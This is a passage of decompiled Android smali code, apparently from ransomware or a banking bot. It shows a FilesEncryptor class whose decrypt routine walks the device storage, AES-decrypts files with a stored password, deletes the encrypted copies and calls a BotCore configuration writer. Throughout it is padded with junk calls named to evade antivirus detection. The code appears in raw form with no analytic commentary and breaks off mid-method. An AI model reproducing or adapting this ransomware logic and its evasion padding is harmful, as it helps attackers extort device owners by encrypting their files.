    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static/range {v0 .. v6}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction10(Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 449
    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    .line 454
    .end local v7    # "i":I
    :goto_1
    return-object v0

    .line 439
    .restart local v7    # "i":I
    :cond_0
    add-int/lit8 v7, v7, 0x1

    goto/16 :goto_0

    .line 454
    .end local v7    # "i":I
    :cond_1
    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    goto :goto_1
.end method


# virtual methods
.method public decrypt()V
    .locals 12

    .prologue
    const/4 v11, 0x0

    const/4 v10, 0x1

    .line 295
    const v0, 0x14ec99ce

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const v1, 0x10c1c80d

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    const v3, 0x348cf8ff

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5

    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static/range {v0 .. v6}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction10(Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 296
    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const-string v2, "pQdtvrE"

    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const-string v4, "bCAEUG"

    const v5, 0xd72c086

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction1(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 297
    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const-string v2, "fSAlhSM"

    const v3, 0x34f3e1fc

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    const-string v5, "RisVos"

    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static/range {v0 .. v6}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction9(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 298
    const-string v0, "aawwc"

    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x4ff4fb3

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const v4, 0x395d90d4

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    const-string v5, "nACWASnI"

    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static/range {v0 .. v6}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction8(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 300
    sget-object v0, Lcom/androidl/mqmgr/Constants;->ENCRYPT_PASSWORD:Ljava/lang/String;

    if-eqz v0, :cond_3

    sget-object v0, Lcom/androidl/mqmgr/Constants;->ENCRYPT_PASSWORD:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_3

    .line 301
    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const-string v2, "nfdAbbbhhSp"

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const-string v4, "UGSfUhW"

    const v5, 0x31957c97

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction1(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 302
    new-instance v0, Ljava/io/File;

    invoke-static {}, Lcom/androidl/mqmgr/Utils;->getRootPath()Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-direct {p0, v0}, Lcom/androidl/mqmgr/FilesEncryptor;->getFileNames(Ljava/io/File;)V

    .line 303
    const v0, 0x200df427

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const-string v1, "sRHqFHVs"

    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const v4, 0xe00c6fe

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    const v5, 0x38c20953

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static/range {v0 .. v6}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction11(Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/Boolean;)V

    .line 304
    iget-object v0, p0, Lcom/androidl/mqmgr/FilesEncryptor;->filesToDecrypt:Ljava/util/ArrayList;

    invoke-virtual {v0}, Ljava/util/ArrayList;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_2

    .line 305
    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const v1, 0x24f12c4f

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const-string v2, "nMrElK"

    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const-string v4, "rvGUt"

    const-string v5, "scBgLq"

    invoke-static/range {v0 .. v5}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction6(Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 306
    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const-string v1, "PwikiBNT"

    const v2, 0x14df18c5

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction12(Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 308
    const/4 v0, 0x1

    :try_start_0
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const-string v1, "MSbSpA"

    const v2, 0x1ea246a1

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction12(Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 309
    const/4 v0, 0x1

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const-string v1, "cgHaF"

    const v2, 0x39d53d50

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction12(Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 310
    const-string v0, "mTiJq"

    const v1, 0x318441e4

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const-string v2, "aVwiaRTaeJ"

    const-string v3, "EKQpMllE"

    const/4 v4, 0x1

    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    const/4 v5, 0x0

    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction5(Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 311
    new-instance v7, Lcom/androidl/mqmgr/AesCrypt;

    invoke-direct {v7}, Lcom/androidl/mqmgr/AesCrypt;-><init>()V

    .line 312
    .local v7, "aes":Lcom/androidl/mqmgr/AesCrypt;
    const/4 v0, 0x1

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const/4 v1, 0x0

    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const-string v2, "SKWtp"

    const/4 v3, 0x1

    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    invoke-static {v0, v1, v2, v3}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction2(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 313
    const-string v0, "AhlIvlSOf"

    const v1, 0x28d2e264

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const-string v2, "QObrbE"

    const-string v3, "oqBaT"

    const/4 v4, 0x1

    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    const/4 v5, 0x0

    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction5(Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 314
    sget-object v0, Lcom/androidl/mqmgr/Constants;->ENCRYPT_PASSWORD:Ljava/lang/String;

    invoke-virtual {v7, v0}, Lcom/androidl/mqmgr/AesCrypt;->setPassword(Ljava/lang/String;)V

    .line 315
    const v0, 0xb66e36a

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const v1, 0x2f0a7fab

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const/4 v2, 0x0

    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    const v3, 0x38355e5

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    const/4 v4, 0x1

    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    const/4 v5, 0x1

    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5

    const/4 v6, 0x0

    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static/range {v0 .. v6}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction10(Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 316
    invoke-virtual {v7}, Lcom/androidl/mqmgr/AesCrypt;->init()V

    .line 317
    const/4 v0, 0x0

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const/4 v1, 0x0

    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const-string v2, "iwoHcgm"

    const v3, 0x26d40f1c

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    const/4 v4, 0x0

    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    const-string v5, "jClrGj"

    const/4 v6, 0x1

    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static/range {v0 .. v6}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction9(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 318
    iget-object v0, p0, Lcom/androidl/mqmgr/FilesEncryptor;->filesToDecrypt:Ljava/util/ArrayList;

    invoke-virtual {v0}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object v9

    :cond_0
    :goto_0
    invoke-interface {v9}, Ljava/util/Iterator;->hasNext()Z

    move-result v0

    if-eqz v0, :cond_1

    invoke-interface {v9}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Ljava/lang/String;

    .line 319
    .local v8, "fileName":Ljava/lang/String;
    const/4 v0, 0x1

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const/4 v1, 0x1

    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const-string v2, "CKMMCEGj"

    const/4 v3, 0x0

    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const-string v4, "KOACIjEbr"

    const v5, 0x2ba0ed47

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction1(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 320
    const/4 v0, 0x0

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const/4 v1, 0x1

    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const-string v2, "UtIvCbEttOd"

    const/4 v3, 0x1

    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    invoke-static {v0, v1, v2, v3}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction2(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 321
    const-string v0, "vpInnQ"

    const v1, 0x1a71672c

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const-string v2, "bvnIGlSS"

    const-string v3, "NVePB"

    const/4 v4, 0x1

    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    const/4 v5, 0x1

    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction5(Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 322
    const/4 v0, 0x0

    const-string v1, "."

    invoke-virtual {v8, v1}, Ljava/lang/String;->lastIndexOf(Ljava/lang/String;)I

    move-result v1

    invoke-virtual {v8, v0, v1}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v7, v8, v0}, Lcom/androidl/mqmgr/AesCrypt;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 323
    const/4 v0, 0x1

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const/4 v1, 0x0

    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const-string v2, "VwkNJca"

    const v3, 0x2493937c    # 6.4000936E-17f

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    const/4 v4, 0x1

    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    const-string v5, "MMGjU"

    const/4 v6, 0x1

    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static/range {v0 .. v6}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction9(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 324
    const v0, 0x20dad7b7

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const-string v1, "BPRqs"

    const/4 v2, 0x1

    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    const/4 v3, 0x1

    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const v4, 0x3928f251

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    const v5, 0x36010844

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    const/4 v6, 0x1

    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static/range {v0 .. v6}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction11(Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/Boolean;)V

    .line 325
    invoke-direct {p0, v8}, Lcom/androidl/mqmgr/FilesEncryptor;->deleteFile(Ljava/lang/String;)V

    .line 326
    const/4 v0, 0x1

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const/4 v1, 0x0

    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x12aab88e

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "LeVVsw"

    const/4 v4, 0x1

    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    const v5, 0x1e187108

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction7(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 327
    const/4 v0, 0x1

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const v1, 0x3554bd45

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const-string v2, "OSfdhrIOU"

    const/4 v3, 0x1

    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const-string v4, "WQdEEtOhM"

    const-string v5, "mTNBN"

    invoke-static/range {v0 .. v5}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction6(Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 328
    const/4 v0, 0x1

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const/4 v1, 0x1

    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const-string v2, "fjfWOM"

    const v3, 0xaff0c02

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    const/4 v4, 0x0

    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    const-string v5, "NLucFm"

    const/4 v6, 0x0

    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static/range {v0 .. v6}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction9(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 329
    const/4 v0, 0x0

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const-string v1, "nCAfpGKp"

    const v2, 0x2e748ea9

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction12(Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto/16 :goto_0

    .line 332
    .end local v7    # "aes":Lcom/androidl/mqmgr/AesCrypt;
    .end local v8    # "fileName":Ljava/lang/String;
    :catch_0
    move-exception v0

    .line 333
    :cond_1
    const-string v0, "ddOtfSM"

    const-string v1, "NuJHkoNLqi"

    const v2, 0x1b15c7a1

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction0(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 336
    :cond_2
    sput-boolean v10, Lcom/androidl/mqmgr/Constants;->FILES_WERE_DECRYPTED:Z

    .line 337
    const v0, 0x1f2ee779

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const-string v1, "ljUpI"

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const v4, 0x6fcbd5c

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    const v5, 0x2d78a314

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static/range {v0 .. v6}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction11(Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/Boolean;)V

    .line 338
    const-string v0, "bdGQlIl"

    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x36d6c4c8

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const v4, 0x2355ff8f

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    const-string v5, "Nukscuwc"

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static/range {v0 .. v6}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction8(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 339
    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const-string v1, "IUCMbhn"

    const v2, 0x241af896

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction12(Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 340
    invoke-static {}, Lcom/androidl/mqmgr/BotCore;->writePrivateConfig()V

    .line 341
    const v0, 0xa260d08

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const v1, 0x26063d21

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    const v3, 0x10f3241c

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static/range {v0 .. v6}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction10(Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 342
    const-string v0, "vhvEblO"

    const-string v1, "mFmPTF"

    const v2, 0x24376048

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction0(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 343
    const v0, 0xf9ce228

